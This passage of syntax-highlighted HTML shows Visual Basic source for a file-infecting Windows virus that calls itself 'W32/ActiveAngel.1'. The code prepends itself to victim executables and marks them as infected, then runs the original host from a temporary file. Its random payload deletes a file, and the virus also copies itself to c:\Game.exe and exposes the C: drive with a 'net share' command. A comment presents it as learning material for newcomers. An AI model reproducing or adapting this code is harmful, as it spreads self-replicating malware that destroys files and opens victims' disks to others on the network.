</span><span class="sc0">                </span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">i</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">LBound</span><span class="sc6">(</span><span class="sc7">oasis</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">To</span><span class="sc0"> </span><span class="sc7">UBound</span><span class="sc6">(</span><span class="sc7">oasis</span><span class="sc6">)</span><span class="sc0">
                    </span><span class="sc7">oasis2$</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">oasis2$</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Chr$</span><span class="sc6">(</span><span class="sc7">oasis</span><span class="sc6">(</span><span class="sc7">i</span><span class="sc6">))</span><span class="sc0">
                </span><span class="sc3">Next</span><span class="sc0">
                </span><span class="sc1">'//check if its infected
</span><span class="sc0">                </span><span class="sc3">If</span><span class="sc0"> </span><span class="sc3">Mid</span><span class="sc6">(</span><span class="sc7">oasis2$</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Len</span><span class="sc6">(</span><span class="sc7">oasis2$</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Len</span><span class="sc6">(</span><span class="sc7">oasis2$</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc0"> </span><span class="sc7">Val</span><span class="sc6">(</span><span class="sc7">SigLen</span><span class="sc6">))</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc7">inf_mark$</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
                </span><span class="sc1">'//its not infected so infect it
</span><span class="sc0">                    </span><span class="sc7">Open</span><span class="sc0"> </span><span class="sc7">TargetName$</span><span class="sc0"> </span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">Binary</span><span class="sc0"> </span><span class="sc7">Access</span><span class="sc0"> </span><span class="sc7">Write</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc9">#FreeF
</span><span class="sc0">                        </span><span class="sc7">Put</span><span class="sc0"> </span><span class="sc9">#FreeF, 1, AngelSource '//write the virus code to the beginning of the file
</span><span class="sc0">                        </span><span class="sc7">Put</span><span class="sc0"> </span><span class="sc9">#FreeF, , oasis2$ '//write the original victims code back
</span><span class="sc0">                        </span><span class="sc7">Put</span><span class="sc0"> </span><span class="sc9">#FreeF, , inf_mark$ '//add the infection marker
</span><span class="sc0">                    </span><span class="sc7">Close</span><span class="sc0"> </span><span class="sc9">#FreeF 'done!
</span><span class="sc0">                </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
             </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
        </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
    </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">

</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">FileLen</span><span class="sc6">(</span><span class="sc7">SelfName$</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&gt;</span><span class="sc0"> </span><span class="sc7">Val</span><span class="sc6">(</span><span class="sc7">VirusSize</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc1">'check if the file is the virus or not
</span><span class="sc0">    </span><span class="sc3">ReDim</span><span class="sc0"> </span><span class="sc7">HostCode</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">To</span><span class="sc0"> </span><span class="sc7">FileLen</span><span class="sc6">(</span><span class="sc7">SelfName$</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc0"> </span><span class="sc7">Val</span><span class="sc6">(</span><span class="sc7">VirusSize</span><span class="sc6">))</span><span class="sc0"> </span><span class="sc1">'create buffer to
</span><span class="sc0">                                                             </span><span class="sc1">'store just the host code
</span><span class="sc0">    </span><span class="sc7">Open</span><span class="sc0"> </span><span class="sc7">SelfName$</span><span class="sc0"> </span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">Binary</span><span class="sc0"> </span><span class="sc7">Access</span><span class="sc0"> </span><span class="sc7">Read</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc9">#FreeF
</span><span class="sc0">       </span><span class="sc3">Get</span><span class="sc0"> </span><span class="sc9">#FreeF, , AngelSource 'get the virus code
</span><span class="sc0">       </span><span class="sc3">Get</span><span class="sc0"> </span><span class="sc9">#FreeF, , HostCode     'get host code
</span><span class="sc0">    </span><span class="sc7">Close</span><span class="sc0"> </span><span class="sc9">#FreeF
</span><span class="sc0">    </span><span class="sc1">'create a temp file for executing the host (infected file)
</span><span class="sc0">    </span><span class="sc7">Open</span><span class="sc0"> </span><span class="sc7">WinDir_$</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"host.exe"</span><span class="sc0"> </span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">Binary</span><span class="sc0"> </span><span class="sc7">Access</span><span class="sc0"> </span><span class="sc7">Write</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc9">#FreeF
</span><span class="sc0">       </span><span class="sc7">Put</span><span class="sc0"> </span><span class="sc9">#FreeF, , HostCode
</span><span class="sc0">    </span><span class="sc7">Close</span><span class="sc0"> </span><span class="sc9">#FreeF
</span><span class="sc0">    </span><span class="sc1">'execute the host and wait for it to finish it's process
</span><span class="sc0">    </span><span class="sc7">idHost</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Shell</span><span class="sc6">(</span><span class="sc7">WinDir_$</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"host.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">vbNormalFocus</span><span class="sc6">)</span><span class="sc0">
    </span><span class="sc7">hHost</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">OpenProcess</span><span class="sc6">(</span><span class="sc7">PROCESS_ALL_ACCESS</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">idHost</span><span class="sc6">)</span><span class="sc0">
    </span><span class="sc7">GetExitCodeProcess</span><span class="sc0"> </span><span class="sc7">hHost</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">iExit</span><span class="sc0">
    </span><span class="sc3">Do</span><span class="sc0"> </span><span class="sc3">While</span><span class="sc0"> </span><span class="sc7">iExit</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">STILL_ACTIVE</span><span class="sc0">
        </span><span class="sc7">GetExitCodeProcess</span><span class="sc0"> </span><span class="sc7">hHost</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">iExit</span><span class="sc0">
        </span><span class="sc7">DoEvents</span><span class="sc0">
    </span><span class="sc3">Loop</span><span class="sc0">
    </span><span class="sc7">Kill</span><span class="sc0"> </span><span class="sc7">WinDir_$</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"host.exe"</span><span class="sc0"> </span><span class="sc1">'delete it when it's finishing executing
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
</span><span class="sc1">'decide if the virus chould activate the payload
</span><span class="sc7">int1</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc10">Int</span><span class="sc6">(</span><span class="sc2">100</span><span class="sc0"> </span><span class="sc6">*</span><span class="sc0"> </span><span class="sc7">Rnd</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">int2</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc10">Int</span><span class="sc6">(</span><span class="sc2">100</span><span class="sc0"> </span><span class="sc6">*</span><span class="sc0"> </span><span class="sc7">Rnd</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">Val</span><span class="sc6">(</span><span class="sc7">int1</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">Like</span><span class="sc0"> </span><span class="sc7">Val</span><span class="sc6">(</span><span class="sc7">int2</span><span class="sc6">))</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
    </span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
    </span><span class="sc7">MsgBox</span><span class="sc0"> </span><span class="sc4">"Blueowl is retarded!"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">vbCritical</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"W32/ActiveAngel.1"</span><span class="sc0">
    </span><span class="sc1">'The following payload CAN harm YOU!
</span><span class="sc0">    </span><span class="sc7">Timer1.Enabled</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc0">
    </span><span class="sc7">Form1.Show</span><span class="sc0">
    </span><span class="sc7">Kill</span><span class="sc0"> </span><span class="sc7">TargetName$</span><span class="sc0"> </span><span class="sc1">'kill random file
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">Copy_</span><span class="sc0">
</span><span class="sc7">Copy_</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">FileCopy_</span><span class="sc6">(</span><span class="sc7">AppName</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"c:\Game.exe"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc1">'copy self to c:\
</span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">MakeShare</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">
</span><span class="sc1">'Not very interesting but good for newbies to learn from i guess lol
</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">GetTarget</span><span class="sc6">(</span><span class="sc7">strPath</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
</span><span class="sc1">'the following code gets the path to the exe from the shortcut file the easy way
</span><span class="sc0">    </span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">GoTo</span><span class="sc0"> </span><span class="sc7">exitFunk</span><span class="sc0">
    </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">wshShell</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Object</span><span class="sc0">
    </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">wshLink</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Object</span><span class="sc0">
    </span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">wshShell</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">CreateObject</span><span class="sc6">(</span><span class="sc4">"WScript.Shell"</span><span class="sc6">)</span><span class="sc0">
    </span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">wshLink</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">wshShell.CreateShortcut</span><span class="sc6">(</span><span class="sc7">strPath</span><span class="sc6">)</span><span class="sc0">
    </span><span class="sc7">GetTarget</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">wshLink.TargetPath</span><span class="sc0">
    </span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">wshLink</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">Nothing</span><span class="sc0">
    </span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">wshShell</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">Nothing</span><span class="sc0">
</span><span class="sc7">exitFunk</span><span class="sc6">:</span><span class="sc0">
    </span><span class="sc3">Exit</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

</span><span class="sc1">'share c:\
</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">MakeShare</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc7">Shell</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc4">"net share "</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc4">"SharedDrive"</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc4">"="</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc4">"c:\"</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">Unload</span><span class="sc0"> </span><span class="sc3">Me</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">

</span><span class="sc1">'check if files exist function
</span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">FileFound</span><span class="sc6">(</span><span class="sc7">Victim</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Boolean</span><span class="sc0">
    </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">lpFindFileData</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">WIN32_FIND_DATA</span><span class="sc0">
    </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">hFindFirst</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
    </span><span class="sc7">hFindFirst</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">FindFirstFile</span><span class="sc6">(</span><span class="sc7">Victim</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">lpFindFileData</span><span class="sc6">)</span><span class="sc0">
    </span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">hFindFirst</span><span class="sc0"> </span><span class="sc6">&gt;</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
        </span><span class="sc7">FindClose</span><span class="sc0"> </span><span class="sc7">hFindFirst</span><span class="sc0">
        </span><span class="sc7">FileFound</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc0">
    </span><span class="sc3">Else</span><span class="sc0">
        </span><span class="sc7">FileFound</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc0">
    </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

</span><span class="sc1">'function to copy file
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">FileCopy_</span><span class="sc6">(</span><span class="sc7">src</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">dest</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
  </span><span class="sc3">Optional</span><span class="sc0"> </span><span class="sc7">FailIfDestExists</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Boolean</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Boolean</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">lRet</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc7">lRet</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">CopyFile</span><span class="sc6">(</span><span class="sc7">src</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">dest</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">FailIfDestExists</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">FileCopy_</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">lRet</span><span class="sc0"> </span><span class="sc6">&gt;</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">Timer1_Timer</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc1">'used for the payload to create random colors
</span><span class="sc7">Randomize</span><span class="sc0"> </span><span class="sc7">Timer</span><span class="sc0">
</span><span class="sc7">Label1.ForeColor</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">QBColor</span><span class="sc6">(</span><span class="sc7">Rnd</span><span class="sc0"> </span><span class="sc6">*</span><span class="sc0"> </span><span class="sc2">15</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">Form1.BackColor</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">QBColor</span><span class="sc6">(</span><span class="sc7">Rnd</span><span class="sc0"> </span><span class="sc6">*</span><span class="sc0"> </span><span class="sc2">15</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">Label1.BackColor</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">QBColor</span><span class="sc6">(</span><span class="sc7">Rnd</span><span class="sc0"> </span><span class="sc6">*</span><span class="sc0"> </span><span class="sc2">15</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">


</span><span class="sc7">module1</span><span class="sc0"> </span><span class="sc11">code</span><span class="sc6">:</span><span class="sc0">


</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">FindFirstFile</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"kernel32"</span><span class="sc0"> </span><span class="sc3">Alias</span><span class="sc0"> </span><span class="sc4">"FindFirstFileA"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">lpFileName</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
    </span><span class="sc7">lpFindFileData</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">WIN32_FIND_DATA</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">FindNextFile</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"kernel32"</span><span class="sc0"> </span><span class="sc3">Alias</span><span class="sc0"> </span><span class="sc4">"FindNextFileA"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">hFindFile</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
    </span><span class="sc7">lpFindFileData</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">WIN32_FIND_DATA</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">FindClose</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"kernel32.dll"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">hFindFile</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">


</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Type</span><span class="sc0"> </span><span class="sc7">FILETIME</span><span class="sc0">
    </span><span class="sc7">dwLowDateTime</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
    </span><span class="sc7">dwHighDateTime</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
    </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Type</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Type</span><span class="sc0"> </span><span class="sc7">WIN32_FIND_DATA</span><span class="sc0">
    </span><span class="sc7">dwFileAttributes</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
    </span><span class="sc7">ftCreationTime</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">FILETIME</span><span class="sc0">
    </span><span class="sc7">ftLastAccessTime</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">FILETIME</span><span class="sc0">
    </span><span class="sc7">ftLastWriteTime</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">FILETIME</span><span class="sc0">
    </span><span class="sc7">nFileSizeHigh</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
    </span><span class="sc7">nFileSizeLow</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
    </span><span class="sc7">dwReserved0</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
    </span><span class="sc7">dwReserved1</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
    </span><span class="sc7">cFileName</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0"> </span><span class="sc6">*</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0">
    </span><span class="sc7">cAlternate</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0"> </span><span class="sc6">*</span><span class="sc0"> </span><span class="sc2">14</span><span class="sc0">
    </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Type</span><span class="sc0">
</span></div></body>
</html>
